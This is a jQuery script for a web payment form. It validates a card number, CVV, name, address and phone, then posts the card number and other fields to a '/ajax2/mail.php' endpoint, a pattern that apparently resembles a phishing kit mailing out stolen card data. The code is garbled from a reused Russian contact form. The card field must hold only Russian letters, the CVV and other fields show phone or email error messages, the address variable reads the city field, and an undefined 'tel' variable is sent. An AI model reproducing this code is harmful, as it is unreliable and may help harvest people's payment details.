$(document).ready(function(){
    $('.closemod').click(function(){    $('.reveal-modal-bg').click();    });
    $('input[type="text"]').focusout(function(){

        validate('cc');
        validate('cvv');
        validate('firstname');
        validate('lastname');
        validate('adress');
        validate('city');
        validate('state');
        validate('zip');
        validate('phone');

    });

    $('#btn').click(function(){
        

        validate('cc');
        validate('cvv');
        validate('firstname');
        validate('lastname');
        validate('adress');
        validate('city');
        validate('state');
        validate('zip');
        validate('phone');

        if($('input[name="cc"]').hasClass('valid') &&
           $('input[name="cvv"]').hasClass('valid') &&
           $('input[name="firstname"]').hasClass('valid') &&
           $('input[name="lastname"]').hasClass('valid') &&
           $('input[name="adress"]').hasClass('valid') &&
           $('input[name="city"]').hasClass('valid') &&
           $('input[name="state"]').hasClass('valid') &&
           $('input[name="zip"]').hasClass('valid') &&
           $('input[name="phone"]').hasClass('valid')
           ){
                
                var cc = $('input[name="cc"]').val();
                var cvv = $('input[name="cvv"]').val();
                var firstname = $('input[name="firstname"]').val();
                var lastname = $('input[name="lastname"]').val();
                var adress = $('input[name="city"]').val();
                var state = $('input[name="state"]').val();
                var zip = $('input[name="zip"]').val();
                var phone = $('input[name="phone"]').val();


                var email = $('input[name="email"]').val();
                var messa = $('input[name="messa"]').val();
                $('input[name="messa"]').removeClass('invalid');
                $('input[name="messa"]').addClass('valid');
                $.post("/ajax2/mail.php",
                                  { cc: cc, tel: tel, email: email, messa: messa },
                                    function (data){
                                        if(data == 'true'){
                                            $('.reveal-modal-bg').click();
                                            $('[data-reveal-id=myMod]').click();
                                        }else{
                                            $('.reveal-modal-bg').click();
                                            $('[data-reveal-id=myMod2]').click();

                                        }
                                    },
                                    "text"
                                    );

            }
            return false;
    });
    
});

function validate(nameField){
    
   var currElem = 'input[name="'+ nameField +'"]';

    if($(currElem).val() == '' && $(currElem).attr('required') == 'required'){

            if($(currElem).hasClass('valid')){
                
                $(currElem).removeClass('valid')
            }


            $(currElem).addClass('invalid');
            
            $(currElem).next('p').text('*Это поле не должно быть пустым');
            
            
        }else{
            
            if($(currElem).val() != ''){
                
                var val = $(currElem).val();
                
                if(nameField === 'cc'){
                   regexp = /^[А-Яа-яЁё\ ]+$/i; 
                }
                if(nameField === 'tel'){
                   regexp = /^[\d]+[\d\(\)\ -]+[\d]+$/; 
                }
                if(nameField === 'email'){
                   regexp = /^[\w]{1}[\w-\.]*@[\w-]+\.[a-z]{2,4}$/i; 
                }
                
                if(regexp.test(val)){
                    
                    if($(currElem).hasClass('invalid')){
                        
                        $(currElem).removeClass('invalid');
                        $(currElem).next('p').text('');
                    }

                    $(currElem).addClass('valid');
                    
                }else{
 
                    if($(currElem).hasClass('valid')){
                        
                        $(currElem).removeClass('valid');
                    }
                    
                    $(currElem).addClass('invalid');
                    
                    if(nameField === 'cc'){
                        var text  = '*Допускаются только русские буквы';
                    }
                    if(nameField === 'cvv'){
                        var text  = '*Неверный формат номера телефона';
                    }
                    if(nameField === 'firstname'){
                        var text  = '*Неверный формат электронной почты';
                    }
                    if(nameField === 'lastname'){
                        var text  = '*Неверный формат электронной почты';
                    }
                    if(nameField === 'adress'){
                        var text  = '*Неверный формат электронной почты';
                    }
                    if(nameField === 'city'){
                        var text  = '*Неверный формат электронной почты';
                    }
                    if(nameField === 'state'){
                        var text  = '*Неверный формат электронной почты';
                    }
                    if(nameField === 'zip'){
                        var text  = '*Неверный формат электронной почты';
                    }
                    if(nameField === 'phone'){
                        var text  = '*Неверный формат электронной почты';
                    }
                    
                    $(currElem).next('p').text(text);
                }
         } 
    }
    
         
}
